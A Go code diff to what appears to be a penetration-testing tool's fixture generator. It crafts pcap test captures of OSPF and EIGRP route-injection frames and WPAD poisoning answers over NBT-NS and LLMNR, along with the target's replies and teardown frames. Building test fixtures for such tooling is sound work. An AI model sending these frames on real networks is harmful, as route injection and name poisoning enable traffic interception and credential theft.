@@ -11,14 +11,33 @@
 // byte-for-byte where deterministic.
 //
 // Fixtures produced:
-//   - ospf.pcap:           hello, db-desc, lsa-update (attack TX)
+//   - ospf.pcap:           hello, hello listing the target, db-desc,
+//     lsa-update (attack TX)
 //   - ospf_restore.pcap:   lsa-flush, goodbye-hello (teardown TX)
-//   - ospf_target.pcap:    target hello response (FRR-shaped, fed via PushRX)
-//   - eigrp.pcap:          hello (Init), route-inject update (attack TX)
-//   - eigrp_restore.pcap:   goodbye hello (teardown TX)
-//   - eigrp_target.pcap:   target hello response (fed via PushRX)
-//   - eigrp_reject.pcap:    target goodbye (auth-mismatch refusal, fed via PushRX)
-//   - wpad.pcap:           nbt-ns response, llmnr response (attack TX)
+//   - ospf_target.pcap:    the target's hello, then its hello listing the
+//     attack leg's router ID (RFC 2328 section 10.5, 2-WayReceived), fed
+//     via PushRX
+//   - eigrp.pcap:          hello with the Parameters TLV (RFC 7868 section
+//     6.7.1), null update with the Init flag (section 5.3.3), route-inject
+//     update (attack TX)
+//   - eigrp_restore.pcap:  goodbye, a hello with the Peer Termination TLV
+//     (section 6.7.7) (teardown TX)
+//   - eigrp_target.pcap:   the target's hello in AS 100, then its unicast
+//     hello acknowledging the null update (section 5.2), fed via PushRX
+//   - eigrp_reject.pcap:   the target's goodbye with the Peer Termination
+//     TLV, then its older form, a Parameters TLV with K1 to K5 at 255, fed
+//     via PushRX
+//   - wpad.pcap:           the nbt-ns answer and the llmnr answer, each
+//     unicast to the querier with the query's id (attack TX)
+//   - wpad_query.pcap:     the client's NBT-NS query (RFC 1002 section
+//     4.2.12) and LLMNR query (RFC 4795 section 2.1.1) for wpad, fed via
+//     PushRX
+//
+// The response fixtures are spec-authored from the RFC layouts and decoded
+// by gopacket or the owned layer as the second reader; the Wireshark sample
+// capture page (https://wiki.wireshark.org/SampleCaptures, fetched
+// 2026-10-15) carries no licence statement for its capture files, so no
+// frame is copied from one.
 //
 // Run from the attacks/routing directory:
 //
@@ -94,18 +113,19 @@ func main() {
 
 func run() error {
 	// OSPF fixtures
-	writePcap("ospf.pcap", ospfHelloFrame(), ospfDBDescFrame(), ospfLSAUpdateFrame())
+	writePcap("ospf.pcap", ospfHelloFrame(nil), ospfHelloFrame([]uint32{targetRouterID}), ospfDBDescFrame(), ospfLSAUpdateFrame())
 	writePcap("ospf_restore.pcap", ospfLSAFlushFrame(), ospfGoodbyeFrame())
-	writePcap("ospf_target.pcap", ospfTargetHelloFrame())
+	writePcap("ospf_target.pcap", ospfTargetHelloFrame(nil), ospfTargetHelloFrame([]uint32{attackerRouterID}))
 
 	// EIGRP fixtures
-	writePcap("eigrp.pcap", eigrpHelloFrame(eigrpFlagInit), eigrpRouteInjectFrame())
-	writePcap("eigrp_restore.pcap", eigrpHelloFrame(eigrpFlagGoodbye))
-	writePcap("eigrp_target.pcap", eigrpTargetHelloFrame())
-	writePcap("eigrp_reject.pcap", eigrpRejectFrame())
+	writePcap("eigrp.pcap", eigrpHelloFrame(), eigrpNullUpdateFrame(), eigrpRouteInjectFrame())
+	writePcap("eigrp_restore.pcap", eigrpGoodbyeFrame())
+	writePcap("eigrp_target.pcap", eigrpTargetHelloFrame(), eigrpTargetAckFrame())
+	writePcap("eigrp_reject.pcap", eigrpRejectFrame(), eigrpRejectK255Frame())
 
 	// WPAD fixtures
 	writePcap("wpad.pcap", wpadNBTNSFrame(), wpadLLMNRFrame())
+	writePcap("wpad_query.pcap", wpadNBTNSQueryFrame(), wpadLLMNRQueryFrame())
 
 	if genErr != nil {
 		return genErr
@@ -116,7 +136,7 @@ func run() error {
 	return nil
 }
 
-// OSPF frames use raw craft — the fork has no SerializeTo for OSPFv2.
+// OSPF frames use raw craft, since the fork has no SerializeTo for OSPFv2.
 
 func ospfHeader(ospfType byte, bodyLen int) []byte {
 	hdr := make([]byte, ospfHdrLen)
@@ -203,8 +223,20 @@ func ospfFrame(ospfType byte, body []byte) []byte {
 	return craft(eth, ip, gopacket.Payload(payload))
 }
 
-func ospfHelloFrame() []byte {
-	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyBytes())
+// ospfHelloFrame builds the attack leg's hello listing neighbors.
+func ospfHelloFrame(neighbors []uint32) []byte {
+	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyWith(neighbors))
+}
+
+// ospfHelloBodyWith appends the neighbor router IDs to the hello body.
+func ospfHelloBodyWith(neighbors []uint32) []byte {
+	body := ospfHelloBodyBytes()
+	for _, n := range neighbors {
+		nb := make([]byte, 4)
+		binary.BigEndian.PutUint32(nb, n)
+		body = append(body, nb...)
+	}
+	return body
 }
 
 func ospfGoodbyeFrame() []byte {
@@ -268,19 +300,15 @@ func ospfLSAFlushFrame() []byte {
 	return ospfFrame(byte(layers.OSPFLinkStateUpdate), body)
 }
 
-func ospfTargetHelloFrame() []byte {
-	// FRR-shaped target hello: router ID = 10.0.0.2, area 0
+// ospfTargetHelloFrame builds the target's hello (router ID 10.0.0.2, area
+// 0) listing neighbors.
+func ospfTargetHelloFrame(neighbors []uint32) []byte {
 	hdr := make([]byte, ospfHdrLen)
 	hdr[0] = 2
 	hdr[1] = byte(layers.OSPFHello)
-	body := ospfHelloBodyBytes()
+	body := ospfHelloBodyWith(neighbors)
 	binary.BigEndian.PutUint32(hdr[4:8], targetRouterID)
 	binary.BigEndian.PutUint32(hdr[8:12], 0)
-	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))
-	// List attacker as neighbor (adjacency seen)
-	nb := make([]byte, 4)
-	binary.BigEndian.PutUint32(nb, attackerRouterID)
-	body = append(body, nb...)
 	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))
 
 	payload := append(hdr, body...)
@@ -303,23 +331,99 @@ func ospfTargetHelloFrame() []byte {
 
 // EIGRP frames go through netpen's owned EIGRP layer.
 
-func eigrpHelloFrame(flags uint32) []byte {
-	eigrp := &nl.EIGRP{
+// eigrpParameters is the Parameters TLV value (RFC 7868 section 6.7.1):
+// K1 1, K2 0, K3 1, K4 0, K5 0, K6 0, hold time 15 s.
+var eigrpParameters = []byte{1, 0, 1, 0, 0, 0, 0x00, 0x0f}
+
+// eigrpK255 is the older goodbye form: a Parameters TLV with K1 to K5 at
+// 255.
+var eigrpK255 = []byte{255, 255, 255, 255, 255, 0, 0x00, 0x0f}
+
+func eigrpHelloFrame() []byte {
+	return eigrpFrame(&nl.EIGRP{
 		Version:          2,
 		Opcode:           nl.EIGRPOpcodeHello,
-		Flags:            flags,
-		VirtualRouterID:  0,
 		AutonomousSystem: 100,
+		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
+	})
+}
+
+// eigrpNullUpdateFrame builds the update with the Init flag and no TLV
+// (RFC 7868 section 5.3.3).
+func eigrpNullUpdateFrame() []byte {
+	return eigrpFrame(&nl.EIGRP{
+		Version:          2,
+		Opcode:           nl.EIGRPOpcodeUpdate,
+		Flags:            eigrpFlagInit,
+		SequenceNumber:   1,
+		AutonomousSystem: 100,
+	})
+}
+
+// eigrpGoodbyeFrame builds the goodbye: a hello carrying the Parameters
+// TLV and the Peer Termination TLV (type 0x0007) naming the attack leg's
+// IPv4.
+func eigrpGoodbyeFrame() []byte {
+	return eigrpFrame(&nl.EIGRP{
+		Version:          2,
+		Opcode:           nl.EIGRPOpcodeHello,
+		AutonomousSystem: 100,
+		TLVs: []nl.EIGRPTLV{
+			{Type: 0x0001, Value: eigrpParameters},
+			{Type: 0x0007, Value: attackerIP.To4()},
+		},
+	})
+}
+
+// eigrpFromTarget builds Ethernet → IPv4 (proto 88) → EIGRP from the
+// target router to dst.
+func eigrpFromTarget(dst net.IP, dstMAC net.HardwareAddr, eigrp *nl.EIGRP) []byte {
+	eth := &layers.Ethernet{
+		SrcMAC:       targetMAC,
+		DstMAC:       dstMAC,
+		EthernetType: layers.EthernetTypeIPv4,
 	}
-	return eigrpFrame(eigrp)
+	ip := &layers.IPv4{
+		Version:  4,
+		IHL:      5,
+		TTL:      1,
+		Protocol: 88,
+		SrcIP:    net.IPv4(10, 0, 0, 2),
+		DstIP:    dst,
+	}
+	return craft(eth, ip, eigrp)
+}
+
+// eigrpTargetAckFrame builds the target's unicast hello acknowledging the
+// null update: Ack number 1 (RFC 7868 section 5.2), sent to the attack
+// leg's IPv4.
+func eigrpTargetAckFrame() []byte {
+	return eigrpFromTarget(attackerIP, srcBytes(), &nl.EIGRP{
+		Version:          2,
+		Opcode:           nl.EIGRPOpcodeHello,
+		AckNumber:        1,
+		AutonomousSystem: 100,
+		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
+	})
+}
+
+// eigrpRejectK255Frame builds the older goodbye form from the target.
+func eigrpRejectK255Frame() []byte {
+	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
+		Version:          2,
+		Opcode:           nl.EIGRPOpcodeHello,
+		AutonomousSystem: 100,
+		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpK255}},
+	})
 }
 
 func eigrpRouteInjectFrame() []byte {
 	routeValue := buildIPv4RouteTLV(24, net.IPv4(10, 99, 0, 0))
+	// The null update took sequence 1, so the route update is 2.
 	eigrp := &nl.EIGRP{
 		Version:          2,
 		Opcode:           nl.EIGRPOpcodeUpdate,
-		SequenceNumber:   1,
+		SequenceNumber:   2,
 		VirtualRouterID:  0,
 		AutonomousSystem: 100,
 		TLVs: []nl.EIGRPTLV{
@@ -346,53 +450,29 @@ func eigrpFrame(eigrp *nl.EIGRP) []byte {
 	return craft(eth, ip, eigrp)
 }
 
+// eigrpTargetHelloFrame builds the target's hello in AS 100 with the
+// Parameters TLV.
 func eigrpTargetHelloFrame() []byte {
-	eigrp := &nl.EIGRP{
+	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
 		Version:          2,
 		Opcode:           nl.EIGRPOpcodeHello,
-		Flags:            eigrpFlagInit,
-		VirtualRouterID:  0,
 		AutonomousSystem: 100,
-	}
-	eth := &layers.Ethernet{
-		SrcMAC:       targetMAC,
-		DstMAC:       eigrpMcastMAC,
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-	ip := &layers.IPv4{
-		Version:  4,
-		IHL:      5,
-		TTL:      1,
-		Protocol: 88,
-		SrcIP:    net.IPv4(10, 0, 0, 2),
-		DstIP:    eigrpMcast,
-	}
-	return craft(eth, ip, eigrp)
+		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
+	})
 }
 
+// eigrpRejectFrame builds the target's goodbye: a hello carrying the Peer
+// Termination TLV (RFC 7868 section 6.7.7) naming the attack leg.
 func eigrpRejectFrame() []byte {
-	// Auth-mismatch rejection: target sends goodbye
-	eigrp := &nl.EIGRP{
+	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
 		Version:          2,
 		Opcode:           nl.EIGRPOpcodeHello,
-		Flags:            eigrpFlagGoodbye,
-		VirtualRouterID:  0,
 		AutonomousSystem: 100,
-	}
-	eth := &layers.Ethernet{
-		SrcMAC:       targetMAC,
-		DstMAC:       eigrpMcastMAC,
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-	ip := &layers.IPv4{
-		Version:  4,
-		IHL:      5,
-		TTL:      1,
-		Protocol: 88,
-		SrcIP:    net.IPv4(10, 0, 0, 2),
-		DstIP:    eigrpMcast,
-	}
-	return craft(eth, ip, eigrp)
+		TLVs: []nl.EIGRPTLV{
+			{Type: 0x0001, Value: eigrpParameters},
+			{Type: 0x0007, Value: attackerIP.To4()},
+		},
+	})
 }
 
 func buildIPv4RouteTLV(prefixLen int, dest net.IP) []byte {
@@ -412,9 +492,64 @@ func buildIPv4RouteTLV(prefixLen int, dest net.IP) []byte {
 
 // WPAD frames use the owned NBNS + LLMNR layers.
 
+// The client that asks for wpad: its MAC, IPv4, and the ports and ids of
+// its NBT-NS and LLMNR queries.
+var (
+	clientMAC           = fixtureaddr.MustMAC("00:aa:bb:cc:dd:01")
+	clientIP            = net.IPv4(10, 0, 0, 2)
+	nbnsQueryID  uint16 = 0x1234
+	llmnrQueryID uint16 = 0x5678
+)
+
+// udpFrame builds Ethernet → IPv4 → UDP → layer between the given hosts.
+func udpFrame(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, srcPort, dstPort layers.UDPPort, ttl uint8, layer gopacket.SerializableLayer) []byte {
+	eth := &layers.Ethernet{
+		SrcMAC:       srcMAC,
+		DstMAC:       dstMAC,
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+	ip := &layers.IPv4{
+		Version:  4,
+		IHL:      5,
+		TTL:      ttl,
+		Protocol: layers.IPProtocolUDP,
+		SrcIP:    srcIP,
+		DstIP:    dstIP,
+	}
+	udp := &layers.UDP{SrcPort: srcPort, DstPort: dstPort}
+	_ = udp.SetNetworkLayerForChecksum(ip)
+	return craft(eth, ip, udp, layer)
+}
+
+// wpadNBTNSQueryFrame builds the client's NBT-NS name query for WPAD (RFC
+// 1002 section 4.2.12), broadcast from port 137.
+func wpadNBTNSQueryFrame() []byte {
+	nbns := &nl.NBNS{
+		ID:        nbnsQueryID,
+		Flags:     0x0110, // query, recursion desired, broadcast
+		QDCount:   1,
+		Questions: []nl.NBNSQuestion{{Name: "WPAD", QType: 0x0020, QClass: 0x0001}},
+	}
+	return udpFrame(clientMAC, broadcastMAC, clientIP, net.IPv4(255, 255, 255, 255), 137, 137, 128, nbns)
+}
+
+// wpadLLMNRQueryFrame builds the client's LLMNR query for wpad (RFC 4795
+// section 2.1.1), to the LLMNR group from an ephemeral port.
+func wpadLLMNRQueryFrame() []byte {
+	llmnr := &nl.LLMNR{
+		ID:        llmnrQueryID,
+		Flags:     0x0000,
+		QDCount:   1,
+		Questions: []nl.LLMNRQuestion{{Name: "wpad", QType: 1, QClass: 1}},
+	}
+	return udpFrame(clientMAC, fixtureaddr.MustMAC("01:00:5e:00:00:fc"), clientIP, llmnrMcast, 51000, 5355, 1, llmnr)
+}
+
+// wpadNBTNSFrame builds the answer to the NBT-NS query, unicast to the
+// client with the query's id.
 func wpadNBTNSFrame() []byte {
 	nbns := &nl.NBNS{
-		ID:      0x1234,
+		ID:      nbnsQueryID,
 		Flags:   0x8500,
 		ANCount: 1,
 		Answers: []nl.NBNSResourceRecord{
@@ -427,22 +562,7 @@ func wpadNBTNSFrame() []byte {
 			},
 		},
 	}
-	eth := &layers.Ethernet{
-		SrcMAC:       srcBytes(),
-		DstMAC:       broadcastMAC,
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-	ip := &layers.IPv4{
-		Version:  4,
-		IHL:      5,
-		TTL:      1,
-		Protocol: layers.IPProtocolUDP,
-		SrcIP:    attackerIP,
-		DstIP:    net.IPv4(255, 255, 255, 255),
-	}
-	udp := &layers.UDP{SrcPort: 137, DstPort: 137}
-	_ = udp.SetNetworkLayerForChecksum(ip)
-	return craft(eth, ip, udp, nbns)
+	return udpFrame(srcBytes(), clientMAC, attackerIP, clientIP, 137, 137, 64, nbns)
 }
 
 func nbnsNodeAddr(ip net.IP) []byte {
@@ -452,9 +572,11 @@ func nbnsNodeAddr(ip net.IP) []byte {
 	return data
 }
 
+// wpadLLMNRFrame builds the answer to the LLMNR query, unicast to the
+// client's address and port with the query's id (RFC 4795 section 2.3).
 func wpadLLMNRFrame() []byte {
 	llmnr := &nl.LLMNR{
-		ID:      0x5678,
+		ID:      llmnrQueryID,
 		Flags:   0x8000,
 		ANCount: 1,
 		Answers: []nl.LLMNRResourceRecord{
@@ -467,22 +589,7 @@ func wpadLLMNRFrame() []byte {
 			},
 		},
 	}
-	eth := &layers.Ethernet{
-		SrcMAC:       srcBytes(),
-		DstMAC:       srcBytes(),
-		EthernetType: layers.EthernetTypeIPv4,
-	}
-	ip := &layers.IPv4{
-		Version:  4,
-		IHL:      5,
-		TTL:      1,
-		Protocol: layers.IPProtocolUDP,
-		SrcIP:    attackerIP,
-		DstIP:    llmnrMcast,
-	}
-	udp := &layers.UDP{SrcPort: 5355, DstPort: 5355}
-	_ = udp.SetNetworkLayerForChecksum(ip)
-	return craft(eth, ip, udp, llmnr)
+	return udpFrame(srcBytes(), clientMAC, attackerIP, clientIP, 5355, 51000, 64, llmnr)
 }
 
 func craft(layersList ...gopacket.SerializableLayer) []byte {
@@ -498,10 +605,12 @@ func craft(layersList ...gopacket.SerializableLayer) []byte {
 	return append([]byte(nil), buf.Bytes()...)
 }
 
-// writePcap writes pkts to path, recording the first failure — its own IO or
-// an assembly error [craft] already recorded — into [genErr] and returning
+// writePcap writes pkts to path, recording the first failure, its own IO or
+// an assembly error [craft] already recorded, into [genErr] and returning
 // without writing, so a bad packet never lands in a fixture and [run] reports
-// the fault.
+// the fault. Each packet is stamped with the epoch, since pcapgo writes the
+// wall clock for a zero stamp and every fixture would then change on each
+// run.
 func writePcap(path string, pkts ...[]byte) {
 	if genErr != nil {
 		return
@@ -523,7 +632,7 @@ func writePcap(path string, pkts ...[]byte) {
 
 	for _, pkt := range pkts {
 		if err := w.WritePacket(gopacket.CaptureInfo{
-			Timestamp:     time.Now(),
+			Timestamp:     time.Unix(0, 0),
 			CaptureLength: len(pkt),
 			Length:        len(pkt),
 		}, pkt); err != nil {
